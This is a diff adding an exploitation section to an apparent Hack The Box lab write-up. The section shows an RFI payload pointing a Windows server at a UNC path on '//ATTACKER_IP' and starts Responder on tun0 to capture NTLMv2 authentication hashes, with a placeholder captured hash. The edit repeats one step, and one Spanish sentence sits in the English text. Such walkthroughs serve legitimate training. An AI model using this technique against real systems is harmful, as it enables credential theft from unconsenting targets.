@@ -173,6 +173,40 @@ Since the server is Windows-based, we can leverage UNC paths:
 <pre>//ATTACKER_IP/test</pre>
 
 
-**This forces the server to authenticate to our machine using NTLM.**
+**This forces the server to authenticate to our machine using NTLM.** Eso es lo que vamos a explotar.
+
+## Exploitation – NTLM Authentication Capture
+
+Before triggering the attack, we need to properly prepare Responder and ensure it is listening for incoming authentication requests.
+The goal is to force the target Windows machine to authenticate to our system using NTLM, allowing us to capture the authentication hash.
+
+**Step 1: Preparing Responder**
+
+First, we identify our VPN network interface using the following command:
+
+<pre>ip a</pre>
+
+
+The VPN interface used by Hack The Box is typically tun0.
+![tun0](img/tun0.jpg)
+
+Once identified, we start Responder on this interface:
+
+<pre>sudo responder -I tun0</pre> 
+
+
+At this point, Responder is actively listening for incoming SMB/HTTP authentication requests, waiting for a client to attempt authentication.
+
+We leave Responder running in the background.
+
+We start Responder on our VPN interface:
+
+<pre>sudo responder -I tun0 </pre>
+
+Then we trigger the RFI payload in the browser.
+Responder captures an NTLMv2 hash:
+
+Administrator::RESPONDER:NTLMv2_HASH
+
 
 
